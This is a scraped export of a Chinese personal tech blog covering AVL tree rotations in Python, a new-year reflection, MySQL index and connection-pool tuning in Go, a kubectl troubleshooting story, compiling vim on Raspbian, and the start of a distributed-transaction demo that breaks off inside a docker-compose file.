对于往左儿子的左子树插入节点造成的不平衡，右旋转可以实现降低左儿子的左子树高度，再次平衡。往右儿子的右子树插入节点造成的不平衡，左旋转可以降低右儿子的右子树高度，再次平衡。但对于左儿子的右子树或右儿子的左子树插入节点造成的不平衡，一次左、右旋转无法实现再平衡。\n再看一个例子。\n旋转前，右儿子的左子树（4-7-6-5）高度是4，旋转后（7-4-6-5）高度不变，依然是4，树仍然不平衡。解决办法也很简单，先把右子树（7）右旋，让右儿子的左子树高度低于右子树，再对整棵树左旋，也就是AVL树的双旋转。\n一步一步看双旋转是怎么解决这个问题的。\n第一步，右儿子的左子树比右儿子右子树高，所以将右儿子右旋，使得右儿子的右子树高于右儿子的左子树。\n我们知道的左旋转时右儿子的左子树高度不变，右儿子的右子树高度-1。这一步前，直接对整棵树左旋时，最高的那颗子树（右儿子的左子树）高度没有变化，树依然不平衡，只是变成了右子树更矮，左子树更高而已。\n而这一步之后，最高的子树变成了右子树的右子树。现在对整棵树左旋，右子树的右子树高度下降了，和原本右子树的左子树高度一致，达成平衡。\n这个原则简单地说，就是左子树下最高的子树应该是左子树，右子树下最高的子树应该是右子树。如果新增节点后不满足这个条件，就要先对左子树左旋，或者对右子树右旋，来满足这个条件。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212  from typing import Optional class AVLTreeNode: \u0026#34;\u0026#34;\u0026#34;树节点 \u0026#34;\u0026#34;\u0026#34; def __init__(self, value: int, parent: \u0026#39;AVLTreeNode\u0026#39;) -\u0026gt; None: self.value = value self.parent = parent self.left: Optional[\u0026#39;AVLTreeNode\u0026#39;] = None self.right: Optional[\u0026#39;AVLTreeNode\u0026#39;] = None @property def height(self) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34;子树高度 Returns: int: 子树高度 \u0026#34;\u0026#34;\u0026#34; return max(self._left_height, self._right_height)+1 @property def _left_height(self): return self.left.height if self.left is not None else 0 @property def _right_height(self): return self.right.height if self.right is not None else 0 @property def balance(self) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;是否平衡 Returns: bool: 是否平衡 \u0026#34;\u0026#34;\u0026#34; return abs(self._left_height-self._right_height) \u0026lt;= 1 def right_rotate(self): \u0026#34;\u0026#34;\u0026#34;节点右旋 \u0026#34;\u0026#34;\u0026#34; if self.left is None: raise Exception(\u0026#39;can not rotate tree with empty left node\u0026#39;) # 旧的根成为右节点 # 旧的根的左节点成为新的根 # 新的根的右节点变成旧的根的左节点 # 旧的根变成新的根的右节点 old_root = self new_root = old_root.left old_root.left = new_root.right new_root.right = old_root # 新根替换旧根 if old_root.parent is not None: if old_root.parent.left == old_root: old_root.parent.left = new_root else: old_root.parent.right = new_root new_root.parent = old_root.parent old_root.parent = new_root if old_root.left is not None: old_root.left.parent = old_root def left_rotate(self): \u0026#34;\u0026#34;\u0026#34;节点左旋 \u0026#34;\u0026#34;\u0026#34; if self.right is None: raise Exception(\u0026#39;can not rotate tree with empty right node\u0026#39;) # 旧的根成为左节点 # 旧的根的右节点成为新的根 # 新的根的左节点作为旧的根的右子树 # 旧的根变成新的根的左子树 old_root = self new_root = self.right old_root.right = new_root.left new_root.left = old_root # 新根替换旧根 if old_root.parent is not None: if old_root.parent.left == old_root: old_root.parent.left = new_root else: old_root.parent.right = new_root new_root.parent = old_root.parent old_root.parent = new_root if old_root.right is not None: old_root.right.parent = old_root assert new_root.right.value \u0026gt; new_root.value assert new_root.left.value \u0026lt; new_root.value def _rebalance(self): if self.balance: return if self._left_height \u0026gt; self._right_height: # 如果最高的子树是左子树的右子树，先对左子树左旋 if self.left.left is not None \\ and self.left.right is not None \\ and self.left.left.height \u0026lt; self.left.right.height: self.left.left_rotate() self.right_rotate() else: # 如果最高的子树是右子树的左子树，先对右子树右旋 if self.right.right is not None \\ and self.right.left is not None \\ and self.right.right.height \u0026lt; self.right.left.height: self.right.right_rotate() self.left_rotate() def insert(self, value: int) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;插入新节点 Args: value (int): 要插入的数据 \u0026#34;\u0026#34;\u0026#34; if self.value \u0026gt; value: if self.left is None: self.left = AVLTreeNode(value, self) else: self.left.insert(value) elif self.value \u0026lt; value: if self.right is None: self.right = AVLTreeNode(value, self) else: self.right.insert(value) else: return self._rebalance() def search(self, value: int) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;搜索值 Args: value (int): 待搜索的值 Returns: bool: 值是否存在 \u0026#34;\u0026#34;\u0026#34; if self.value == value: return True elif self.value \u0026gt; value and self.left is not None: return self.left.search(value) elif self.value \u0026lt; value and self.right is not None: return self.right.search(value) else: return False class AVLTree: \u0026#34;\u0026#34;\u0026#34;AVL tree \u0026#34;\u0026#34;\u0026#34; def __init__(self) -\u0026gt; None: self.root: Optional[AVLTreeNode] = None @property def height(self): \u0026#34;\u0026#34;\u0026#34;AVL树高度 Returns: int: 树高度 \u0026#34;\u0026#34;\u0026#34; if self.root is not None: return self.root.height return 0 @property def balance(self) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;树是否平衡 Returns: bool: 树是否平衡 \u0026#34;\u0026#34;\u0026#34; if self.root is not None: return self.root.balance return True def insert(self, value: int): \u0026#34;\u0026#34;\u0026#34;insert new value Args: value (int): new value \u0026#34;\u0026#34;\u0026#34; if self.root is None: self.root = AVLTreeNode(value, None) else: self.root.insert(value) # AVL 树旋转后根节点可能不再是现在这个节点，需要重新寻找根节点 top = self.root while top.parent is not None: top = top.parent self.root = top def search(self, value: int) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34;search a value Args: value (int): searching value \u0026#34;\u0026#34;\u0026#34; if self.root is None: return False return self.root.search(value)   总结 AVL树只要理解和左右旋转的方法和作用，就不难理解左右旋转与双旋转的意义了。\n单次旋转的目的都是将两侧子树，一颗子树高度+1，一颗子树高度-1，将高度相差2的两颗子树重新平衡。\n单次旋转的限制是只能降低子树中一颗子树的高度，左子树的左子树或右子树的右子树，所以一旦出现左右子树中最高的子树不是左-左或右-右，单次旋转就不能重新平衡。对这种情况，先旋转子树，令左-左或右-右成为最高的子树后，再对根节点旋转，就能重新平衡了。\n","date":"2022-02-11T15:07:00+08:00","permalink":"https://nnnewb.github.io/blog/p/avl-tree/","title":"AVL树"},{"content":"一 其实年前还有一篇写了蛮长的，但因为种种原因反正假期内是没继续动笔写完，今天本来打算继续写，但是看了眼开头，还是把全文 ctrl+a delete 了。\n这次就短一点。\n二 回顾过去，2021年对我而言是怎样的一年？\n当我问自己这个问题，我才发现似乎没有一个能脱口而出的答案。\n普普通通地正常工作，顺便也摸摸鱼。\n偶尔也上GitHub看两眼，有没有什么新鲜玩意儿。\n学了点没用的逆向技术，demo也勉强凑出9+1个star。不过趁这个机会倒是了解了下x86汇编语言，姑且算是个没什么卵用的进步，主流64位的汇编和arm的汇编还是不懂，x86也只能算是盲人摸象。\n又一个玩具，这类玩具太多了。我水平不够，完成度也低，只能说是写这个的时候就是打发时间。\n本来不是很看得上 dtm 这个项目。不为别的，就是觉得作者 segmentfault 上刷博文宣传自己的框架有种保险推销员的感觉，让人觉得不靠谱。但还是老实去看了代码，毕竟比起 Java 写得 seata 之类的框架，dtm 封装比较薄，源码稍微好读一点。\n实际读起来感觉还是有点混乱，最后照着 dtm 文档的时序图写了个案例，配置了opentelemetry。分布式追踪真的很好用，讲真，要是单体应用也能跟着函数追踪出这样一个图就绝了。我觉得可以拿 python 开刀试试。\n尝试入门密码学，但数学基础不好，为了搞明白希尔密码用到的矩阵运算翻了半天搜索引擎才写出来。结果还是没继续学下去。2022也许继续看？好歹把传统密码里的DES、AES学完吧，不求能手写，大概能看明白过程就好。要是能再把原理懂个大概就更好了。\n至于别的，也许我能报菜名一样提一大堆名字，但终究骗不了我自己。是，2021一年时间，各种杂七杂八的技术概念和新名词碰了一堆，但杂而不精，几乎没有什么真正吸收、融会贯通的内容。\n三 工作和生活上还是老一套。\n产品经理走了，于是部门间的矛盾和磨合又来了。我甚至不愿意管这个叫“磨合”，无非是两边一起摆烂罢了。所以还是到此为止，只能期盼好聚好散，2022尝试跳个愿意出更高工资的地方，也许能在中年危机前攒够本钱，下半生是自己做点生意也好，安心打工也好，至少能安顿好一家人，即便不能富足，也得温饱。真心希望这个渺小的愿望可以实现。\n生活上，年底才收到一个坏消息，爷爷病了，可能是肺癌。很难描述听到这个消息的时候我的心情。上初中的时候我的曾祖父去世了，我和曾祖父交流接触很少，但还是有种心里缺了一块的感觉。\n是，人终有一死。但出奇的是我一点也没想什么轻于鸿毛重于泰山。死亡就只是死亡而已，没有意义，什么也没有。时间最终会抚平一切。\n好了。\n2022，还是祝愿爷爷他手术顺利，能活到120岁。\n四 还是要展望下未来的。\n2022年，很快就要26周岁了，还是单身，一年的收入大概能在广州买一两平米的卫生间，存款不比一间卫生间的价值多多少。有一点焦虑。\n焦虑的原因在于我觉得自己配得上更高的工资，或者说，更好的生活，有看得到希望的未来。但理想和现实的矛盾始终无法解决。\n不说那么多了。\n今年有跳槽的想法，也有考个系统分析师证书的想法，但两者恐怕不好兼顾。还好的是系统分析师考试在5月，这段时间来个百日冲刺，运气好的话有机会拿到证书，再在下半年靠证书跳个更高薪的职位。运气不好的话，今年没考上，下半年跳槽还有悬念，那就明年再说了。\n另外更新简历的时候发现，多写点博客还是挺唬人的。21年下半年几个月写了40篇，2022年继续保持的话起码一年一百篇不过分吧，坚持多写几篇，笔耕不辍。\n最好再参与下知名的开源项目，发几个PR。\n小说也想写，短篇整个十几万字总得有。\n梦想嘛，还是要有的。\n来吧，2022！ ","date":"2022-02-09T09:24:00+08:00","permalink":"https://nnnewb.github.io/blog/p/first-blog-in-2022/","title":"2022新年第一篇博客"},{"content":"前言 刚接手管理后台的后端服务，先随便挑个什么东西下手看看。正好注意到一个简单的接口返回时间都蛮长的，于是拿刚从 opentelemetry 的 issue/pr 里抄来的 sqlmw 包装驱动来分析优化下性能。\n0x01 性能分析 预判 下手前预估下可能存在瓶颈的地方。对于这次下手的接口（get_users），整个实现也没几行代码，只有两三个查询，数据量也不大，但是耗时有80ms+。\n其他接口有快有慢，并没有表现出同时增加耗时，而且开发服务器架在内网，排除网络原因，大概还是服务本身的存在的问题。于是考虑瓶颈在数据库或代码中，但具体肯定是要看代码去分析的。既然判断是代码里的问题，那下一步就是测量下耗时情况了。\n对于go，pprof虽然是个不错的主意，但实话说部署在 kubernetes 里，配 pprof 去拉结果有点麻烦，而且还有点点用不惯。正好这个项目里早就配置了 opentracing+jaeger做分布式跟踪，所以就直接抄一下 opentelemetry 的 otelsql ，把SQL查询的详细耗时情况记录下来，就可以开始分析了。\nopentracing收集数据 otelsql 原理是用 sqlmw 在 sql 驱动层级上进行包装sql ==\u0026gt; sqlmw.Driver{mysql.Driver} 。go的sql调用sqlmw.Driver，sqlmw.Driver调用mysql.Driver，如此而已，具体不解释。\n从otelsql借鉴下思路即可，现在 opentracing 已经和 opencensus 合并成了 opentelemetry，但项目也没法说升级就升级，毕竟项目架构设计稀烂，太多地方和 opentracing、jaeger-client 强耦合了。把otelsql里用sqlmw的部分抄出来，改成opentracing的方式创建span完事。\n1 2 3 4 5 6  func (in *sqlInterceptor) ConnExecContext(ctx context.Context, conn driver.ExecerContext, query string, args []driver.NamedValue) (driver.Result, error) { span, ctx := opentracing.StartSpanFromContext(ctx, \u0026#34;ConnExecContext\u0026#34;) defer span.Finish() span.LogKV(\u0026#34;sql.query\u0026#34;, query) return conn.ExecContext(ctx, query, args) }   如此一来， 当go的sql库访问数据库的时候，就会在jaeger里记录一个span，可以清晰地看到耗时情况。\n分析 收集到耗时情况后开始观察，注意到两个问题：\n ConnectorConnect 在每个请求前出现，每次耗时 2ms 左右。但 sql 是有连接池的，这里每次执行查询都产生一次连接显然不对劲。 StmtQueryContext 出现一个耗时极长的查询，占据接近1/2的请求耗时，这条查询就是主要瓶颈。  慢查询的SQL如下。\n1  selectcount(1)fromuserwhererole=1andcreate_timestamp\u0026gt;?andcreate_timestamp\u0026lt;?  是一个简单的 select count(1) 查询，初步考虑是 where 里少了索引。\n0x02 优化 索引优化 既然少索引，那就考虑下加索引。看了下数据库，role和create_timestamp字段都没有索引，于是先分别加上了索引，再 explain ，发现查询类型已经变成了 ref 。再运行查询，发现耗时依然有 20ms+。\n参考 multiple-column index 中的话：\n MySQL can use multiple-column indexes for queries that test all the columns in the index, or queries that test just the first column, the first two columns, the first three columns, and so on. If you specify the columns in the right order in the index definition, a single composite index can speed up several kinds of queries on the same table.\n 文档中还说：\n If a multiple-column index exists on col1 and col2, the appropriate rows can be fetched directly. If separate single-column indexes exist on col1 and col2, the optimizer attempts to use the Index Merge optimization (see Section 8.2.1.3, “Index Merge Optimization”), or attempts to find the most restrictive index by deciding which index excludes more rows and using that index to fetch the rows.\n 也就是说，如果role和create_timestamp分别有索引，mysql会尝试用 Index Merge Optimization 算法来优化查询。但如果有多列索引的话，就能直接获取（文档里的场景能直接获取，但上文的 count(1) 查询应该不行）。\n于是加上多列索引，再explain，发现查询类型变成了range，实际执行发现查询耗时降低至 5ms 左右。\n连接池优化 go的sql包自带连接池应该是比较清楚的。原本怀疑是不是对sql.DB这个结构的用法有问题，但翻了下源码，发现sql.DB.ExecContext之类的接口都会通过连接池取连接，完成后返回连接池。所以理论上来说都应该走连接池的连接，而不是每次查询都创建——除非连接池里没有可用的连接了。另外也谷歌了一圈，sql.DB 似乎也没有什么特别的最佳实践，并没有人提到要手动DB.Conn取连接后自己处理。\n于是初步怀疑下是不是哪里设置了连接池属性出了问题。通过排查源码中设置连接池属性的地方，发现一个自己埋下的坑。\n1 2 3 4 5 6 7 8 9 10  if env.DEBUG { mysqldb.SetMaxIdleConns(0) cfg, err := mysql.ParseDSN(host) if err != nil { cfg = \u0026amp;mysql.Config{} } StartObverseSQLConnPool(cfg.DBName, *mysqlDB, time.Duration(5)*time.Second) }   因为我司这个项目没有配置 metrics 收集和分析，自然也没收集服务的连接池情况。所以当初入职后遇到一个奇怪的连接池耗尽，服务假死，调用栈全部卡在连接池上的问题时，为了判断是不是出现连接泄露，写了个goroutine去监测连接池里连接获取和释放的情况\u0026hellip;\n为了调试方便，还把SetMaxIdleConns设置为了0。\n于是初步怀疑就是这个原因导致连接池罢工，将整段调试代码注释掉之后，再次访问接口，响应时间降低至9.8ms。\n最大头的耗时依然是count(1)查询。\n默认情况下 IdleConn 只有 2，超时也比较短。实际参数应该根据业务访问情况来安排。我这也没什么好的计算公式。连接池参数有问题会影响单条SQL的基本耗时，请求里三四条查询，每条加上几个ms，整个请求时间就拖长了十几ms。在微服务系统里影响还可能放大，别的服务要是多次调用，积累的时延可能就要上百ms了。\n缓存优化 进一步的优化思路就是做缓存。是为了提高服务响应速度，也是为了提高负载能力、减轻查询压力，保护 MySQL 服务。过去年轻无知犯过错，就是考虑性能的时候只关注到了自己写的代码，认为代码跑得快重要——比如把 C 的执行性能吹上天。但事情从来不是这么简单——辩证法说实事求是，要具体问题具体分析。后端从来不是“我的代码”这么简单，如果不能从整个系统的角度出发发现问题，那就算是 CPU 成精了也没辙。\n对于实时性要求不高的接口，将数据缓存一段时间是绝对没问题的。不过因为做缓存是个系统性的事情——要考虑缓存更新的嘛，也不是每个接口都适合缓存，实时性有要求或者查询太复杂的话宁可考虑换成 ES 一类的分布式系统，把压力分摊到更多机器上。当然也意味着要花更多的钱，更难维护。\n我司项目就是个很沙雕的例子，因为最初就没设计缓存，连SQL都在用手工拼接，现在干脆变成了混用 xorm 和 sql。虽然也可以考虑下用 sqlmw 插个缓存，但毕竟没验证过，做第一个吃螃蟹的也意味着要第一个背锅。\n总之，要做那可简单了，直接调 redis 客户端（已经包装过一个 cachetools）设置下缓存，给个时限就完了。缓存过期的时候加个 redlock，让其他客户端先返回旧数据，更新完解锁，所有客户端都返回新数据。\n更系统化的处理，就要考虑下怎么做一个或多个更通用（对业务场景而言更通用，而不是真的对 所有 场景都通用）的缓存层——在SQL驱动层做缓存？ORM层缓存？在请求/响应中做缓存？业务/数据访问层（如DAO）做缓存？缓存用什么键？怎么覆盖尽可能多的查询场景？整个重构的工程量如何把握？值不值得？\n结论 收集性能数据的主要方式：\n metrics pprof opentracing/opentelemetry  优化手段：\n explain 分析查询、优化和建立索引 优化连接池参数 加缓存  还有最重要的，具体问题具体分析。\n","date":"2021-12-31T18:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/an-api-response-time-optimize/","title":"记一次API响应时间优化"},{"content":"懒得分段了，就当做是讲个故事吧。\n背景大概是这样。\n内网公共开发机上配置了 k3s 集群，同时后端开发工作也在这台开发机上进行（通过vscode remote-ssh）。因为公司太抠门，开发机只有117G硬盘容量，除去必要的开发工具、系统环境之类的东西，实际可用一直没超过50%，机器上又跑了很多东西，像是 gitlab-runner、docker的registry、MySQL、elasticsearch、开发集群服务等等，差不多每一两个星期都会出现 disk-pressure 的 taint，导致 pod 被 evicted。实话说能跑就很满足了，毕竟公司抠门到开发部门的上行带宽都贼小，如果把镜像推送到公网的registry去部署的话体验更差。\n今天（周一）来公司之后调了下gitlab-ci，给一个前端项目做持续部署。因为前端对kubernetes这套不熟悉，也没有相关的服务器权限，总之就是很难让他们自己来。但是产品部门又喜欢提那种“按钮移到右上角”、“加个图片”之类的需求（对，我司还没有需求管理系统，开发就是个撸码的无情工具人），前端老是过来找我去部署下环境，就搞得摸鱼都摸不痛快。\n所以，当当当~当~，整一个持续部署呗，反正是个纯前端项目，不用部署配套的后端代码，写个dockerfile再写个helm chart就差不多了，ci调了调构建镜像就完事，不过因为ci部署需要访问集群，所以又改了下.kube/config，删了之前尝试csr方式添加用户的时候加多的 user 和 context ，复制了一份挂载到 runner 容器里。\n然后\u0026hellip;\u0026hellip;问题就来了。\n同事忽然告诉我办公室的服务挂了，于是下意识地打出kgp，卡住。\n等了一会儿，还是卡住。\n又等了一会儿，坐不住了。试了下kubectl cluster-info，继续卡住。\n开始慌了，想起今天的机器有点卡，先看看 free -h 有没有内存泄漏之类的问题导致阻塞，结果发现并没有，于是继续看 htop，cpu使用率也比较正常。再看df -h | grep -vE 'shm|overlay'，发现硬盘使用率96%（估计硬盘主控想死的心都有了，揪着4%的可用空间想把PE数平均到各个区块恐怕不容易）。\n找到问题后松了口气，十有八九是又出现 evicted 了。二话不说直接 docker system df，看到30多G的 build cache 顿时惊了，肯定不是go的构建缓存（手动挂载优化了），那就是 node_modules 又立奇功了。node_modules=黑洞果然不是吹的。\n清理完使用率恢复到63%，但依然有种不安感萦绕于心，于是再次尝试kgp，卡住。\n等了一会儿，喝口水，继续卡着。\n又等了一会儿，淦。\n想了想，journalctl -r -u k3s看看日志，并没有什么发现，倒是注意到很多linkerd之类的我们部门经理搞事的时候遗留下来的玩意儿在报错，service mesh 我不熟，但寻思应该不会影响 kubectl 吧，k3s 本体的 api-server 应该不归 linkerd 管。更何况 linkerd 本身就没配好。再翻了翻看到下面的内容。\n1 2 3 4 5 6 7 8  6 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.685149 794 container_gc.go:85] attempting to delete unused containers 7 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.687723 794 image_gc_manager.go:321] attempting to delete unused images 8 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.782390 794 eviction_manager.go:351] eviction manager: able to reduce ephemeral-storage pressure without evicting pods. 9 12月 25 21:16:17 office k3s[794]: W1225 13:16:17.939242 794 eviction_manager.go:344] eviction manager: attempting to reclaim ephemeral-storage 10 12月 25 21:16:17 office k3s[794]: I1225 13:16:17.939267 794 container_gc.go:85] attempting to delete unused containers 11 12月 25 21:16:17 office k3s[794]: I1225 13:16:17.941771 794 image_gc_manager.go:321] attempting to delete unused images 12 12月 25 21:16:18 office k3s[794]: I1225 13:16:18.033724 794 eviction_manager.go:351] eviction manager: able to reduce ephemeral-storage pressure without evicting pods. 13 12月 25 21:16:28 office k3s[794]: W1225 13:16:28.214032 794 eviction_manager.go:344] eviction manager: attempting to reclaim ephemeral-storage   这个是老问题了，一直没去研究怎么解决。\n1  154 12月 25 21:21:55 office k3s[794]: I1225 13:21:55.021937 794 image_gc_manager.go:304] [imageGCManager]: Disk usage on image filesystem is at 95% which is over the high threshold (85%). Trying to free 182 155 12月 25 21:21:55 office k3s[794]: E1225 13:21:55.025140 794 kubelet.go:1292] Image garbage collection failed multiple times in a row: failed to garbage collect required amount of images. Wanted to free   这次搜了下，应该是 docker system prune 造成 kubelet 找不到可回收的镜像才报错（猜测），不过依然不能解释为啥 kubectl 没反应。于是继续翻了会儿日志，搜索错误，但始终没有什么结果。\n但是同事还要干活，没辙了，先重启下服务器吧。群里说了一声要重启了，等了一会儿跑sudo reboot，重启完连接，继续kgp，卡住。\n嗯\u0026hellip;\u0026hellip;\n早有预料。\njournalctl -r -u k3s --boot 看看重启后的日志，发现还是老一套的问题，docker 手动处理镜像和容器造成的和 kubernetes 的管理机制的冲突，各种找不到镜像或者容器的警告，还有一些错误和trace，但没有一个能解释为什么kubectl没有反应。。。\n直到在kubectl的终端里按下了ctrl+c，在顺手clear之前看到了一行请输入用户名（eng）\u0026hellip;\n警觉。\n忽然想起来，因为 kubectl 这破玩意儿是没有颜色输出的，用习惯了各种彩色输出的命令行工具，kubectl就格外不顺眼。所以在发现kubecolors后，我就直接把kubectl配置成了kubecolor的别名。\n所以\u0026hellip;\u0026hellip;难道是kubecolor的问题？\nwhereis kubectl找到kubectl的绝对路径之后，尝试手动运行/usr/local/bin/kubectl cluster-info，再次出现了那个输入用户名的提示，顿时开始怀疑起.kube/config配置有问题，正好在出现问题之前改过了.kube/config，这里出问题的嫌疑就很吉尔大。\n于是打开.kube/config，检查了一下集群的用户配置，发现果然，是我手欠把办公室集群的用户给删了。草。\n急忙从/etc/rancher/k3s/k3s.yaml复制下用户证书配置，贴进去，再运行kgp果然屁事没有了。\n所以总结如下。\n 别被表面的问题迷惑。 自己犯傻的几率大于基础设施/常用工具犯傻的几率。 遇到问题解决步骤很重要，准确的方向可以省很多时间。  先确定故障表现和复现条件 确定故障点（出现在网络、网关还是应用、数据库），弄清楚是不是新问题 再排查相关配置是否正确，回忆是否有做过相关修改变更 再排查故障点日志，必要的时候参考下代码，毕竟有的时候日志没写清楚错误的上下文    ","date":"2021-12-27T15:21:00+08:00","permalink":"https://nnnewb.github.io/blog/p/why-my-kubectl-not-responding/","title":"排查一个kubectl无反应的问题"},{"content":"前言 raspbian上自带的vim版本还是低了点，像是coc.nvim之类的插件弹警告就搞得很烦。我寻思自己编译一个吧。\n0x01 下载源码 从vim官网下载源码（或者可以从GitHub下，出于网络考虑还是直接从ftp下了），下完直接scp传到树莓派上，tar xf解压好准备开整。\n0x02 配置 惯例先看看文档，README.md里指出源码安装去看src/INSTALL，所以跟着去看。\n在 Unix 一节中提到直接make+make install就完事，但我要的不是编译个默认版本的vim，毕竟还有插件会用到vim的 Pyhon/Python3 特性，比如ycm。\n继续往下翻会看到编译依赖。\n% sudo apt install git % sudo apt install make % sudo apt install clang % sudo apt install libtool-bin  跟着把依赖装好，clang估计是可选项，gcc肯定是能编译vim的。不过以防万一反正全装上。\n后面终于看到了Python3添加支持的方式。\nAdd Python 3 support: % sudo apt install libpython3-dev Uncomment this line in Makefile: \u0026quot;CONF_OPT_PYTHON3 = --enable-python3interp\u0026quot; % make reconfig  虽然说文档让取消注释，但是我不想改东西。所以记一下--enable-python3interp，等会儿加入configure的参数。\n后面又有个关于gui的，因为不使用gui，所以也记一下。\n Unix: COMPILING WITH/WITHOUT GUI\nNOTE: This is incomplete, look in Makefile for more info.\nThese configure arguments can be used to select which GUI to use:\n1 2 3 4  --enable-gui=gtk or: gtk2, motif, athena or auto --disable-gtk-check --disable-motif-check --disable-athena-check   This configure argument can be used to disable the GUI, even when the necessary files are found:\n1  --disable-gui    到时候--disable-gui可以省一点编译时间，虽然本来也没多少编译时间。树莓派性能不是很好，tf卡读写寿命也有限，省一点是一点咯。\n还有个--with-features=big，实际参考vim\u0026rsquo;s versions and features，还是用huge，因为看起来功能比较全。\n再加上参数--enable-multibyte和--enable-cscope就差不多了。再加上必要的一些依赖库。\n1  sudo apt install -y libpython-dev libpython3-dev libperl-dev libncurses-dev   0x03 编译 按照autoconf这套编译系统的常规套路，先运行./configure，带上之前考虑好的参数。\n1 2 3 4 5 6 7 8 9  ./configure \\ \t--prefix=/usr/local/ \\ \t--with-features=huge \\ \t--enable-multibyte \\ \t--disable-gui \\ \t--enable-pythoninterp \\ \t--enable-python3interp \\ \t--enable-perlinterp \\ \t--enable-cscope   最后\n1 2  make sudo make install   等编译完成。\n0x04 设置默认编辑器 用update-alternatives配置默认编辑器，或者在.zshrc里加上alias vim=/usr/local/bin/vim也是可以的。\n1 2 3 4  sudo update-alternatives --install /usr/bin/editor editor /usr/local/bin/vim 1 sudo update-alternatives --set editor /usr/local/bin/vim sudo update-alternatives --install /usr/bin/vi vi /usr/local/bin/vim 1 sudo update-alternatives --set vi /usr/local/bin/vim   总结 vim的编译这么简单应该把功劳算到良好的架构上，功能开关这种东西是要架构清晰地给组件之间划出边界的。\n很多杂鱼公司根本不考虑系统维护，所谓的 创造价值 就是以最快的速度 应付需求 ，想起几年前的自己还真的是天真，以为软件从业起码是有点基本的素养的，起码工程能力是有的。现在我的想法变了，软件从业不是有手就行？产品最想要的就是直接把别家的软件 copy\u0026amp;paste 成自己的，我寻思做软件键盘上磨损最快的就是 ctrl c v这三个键了。\n产品嘛。什么工程性？什么可维护？那跟我有什么关系，反正改需求的dead line是码农的，修bug是码农修，我产品设计要与时俱进，要紧随市场，要服务客户，你就是个写代码的，这也不做那也不做雇你来干什么？\n平常心平常心，扯远了。\n总之，vim，好软件。顺便记得关注下乌干达儿童生存状况（不扯政治地说，vim自称慈善软件(charityware)还是有点东西的，再说下去鲁迅先生就要出来赶苍蝇了）。\n","date":"2021-12-25T10:37:00+08:00","permalink":"https://nnnewb.github.io/blog/p/build-vim8.2-manually-on-raspbian/","title":"在raspbian上手动编译vim8.2"},{"content":"前言 有言道，纸上得来终觉浅，绝知此事要躬行。分布式事务的具体方案，看几篇文章就基本有了概念，但实际应用的机会很少。这不有点闲暇，就试试看把理论化作代码，在实践中检验。\n#1 案例设计 采用分布式事务经典的转账案例：用户从银行A转账到银行B，银行A扣除余额，银行B增加余额。\nXA事务官方规范文档给出的示意图如下。\n用 XA 事务描述，用户的转账操作发生在AP，AP调用TM注册全局事务后，调用银行A（RM）完成扣款（PREPARE），调用银行B（RM）完成增加余额（PREPARE），然后调用TM提交全局事务，TM回调银行A和B提交本地事务。\n图示如下。\n上面的时序图是读了 github.com/yedf/dtm 代码后胡乱分析出来的，图略去了错误处理的部分。根据这个时序图可以做出一个简单的服务划分设计。\n为了更好地观察服务的交互情况，引入了 Jaeger ，如果是为了简化整个案例代码考虑也可以不要。但大部分时候 Jaeger 应该是没什么存在感的。\nnginx 反向代理将 AP 的接口还有 Bank1/Bank2的接口导出给用户访问，实际上案例中没有需要访问 Bank1/Bank2 接口的情况，所以 去掉 nginx 反向代理应该也没什么大关系。\n#2 技术栈 所有服务使用docker-compose部署，kubernetes也没问题。\nMySQL使用5.7版本，jaeger和nginx最新稳定版。AP/Bank服务都使用 Go 语言编写， 使用 Gin 作为 HTTP 服务框架，OpenTelemetry 跟踪，sqlx 做 ORM。\n#3 接口设计 接口url设计有参考 Google APIs 规范，但并不是硬套 RESTful 。\nAP服务提供接口\n /v1alpha1/transfer 转账接口  Bank服务提供接口\n /v1alpha1/trans_in 余额转入 /v1alpha1/trans_out 余额转出 /v1alpha1/tm_callback 事务回调，当AP提交事务或者回滚时，TM回调这个接口并告知需要提交还是回滚  TM服务提供接口\n /v1alpha1/create_global_tx 注册全局事务。 /v1alpha1/register_local_tx 注册本地事务，指定关联哪个全局事务。在AP提交或者回滚的时候TM可以查找出所有本地事务并回调。 /v1alpha1/commit_global_tx 提交全局事务。 /v1alpha1/rollback_global_tx 回滚全局事务。  一共需要实现8个接口，接口会尽量简化。\n#4 框架构建 创建好各个服务的样板（就是简单的用Gin把上面的接口定义好，写好主程序），接着写 Dockerfile 和 docker-compose.yml 把之前设计的服务划分实现出来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81  version:\u0026#39;3.1\u0026#39;services:jaeger:image:jaegertracing/all-in-one:1.29environment:- COLLECTOR_ZIPKIN_HOST_PORT=:9411expose:- 5775- 6831- 6832- 5778- 16686- 14268- 14250- 9411ports:- 16686:16686restart:alwaysmysql:image:mysql:5.7ports:- \u0026#34;3306:3306\u0026#34;environment:MYSQL_ROOT_PASSWORD:rootrestart:alwaysvolumes:- ./scripts/initdb.d/:/docker-entrypoint-initdb.d/:roreverseproxy:image:nginx:mainlineports:- 8080:80restart:alwaysdepends_on:- bank1- bank2- 